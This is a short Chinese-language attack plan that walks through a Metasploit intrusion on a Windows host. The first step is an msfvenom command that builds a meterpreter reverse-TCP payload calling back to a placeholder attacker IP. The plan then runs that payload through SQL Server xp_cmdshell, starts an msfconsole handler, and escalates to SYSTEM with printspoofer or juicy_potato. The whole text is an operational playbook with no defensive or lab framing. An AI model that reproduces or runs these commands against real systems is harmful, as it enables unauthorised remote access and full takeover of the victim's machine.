# Metasploit设置和执行计划

## 🎯 步骤

### 1. 安装Metasploit
- 使用apt安装或从源码安装

### 2. 生成Payload
- 生成Windows reverse shell payload
- 通过xp_cmdshell上传并执行

### 3. 建立Handler
- 设置listener接收连接
- 获取meterpreter session

### 4. 使用Exploit提权
- 使用printspoofer或juicy_potato
- 提权到SYSTEM

## 📝 命令流程

```bash
# 1. 生成payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o /tmp/shell.exe

# 2. 启动handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; exploit"

# 3. 上传并执行payload（通过xp_cmdshell）

# 4. 提权
use exploit/windows/local/printspoofer
set SESSION 1
exploit
```
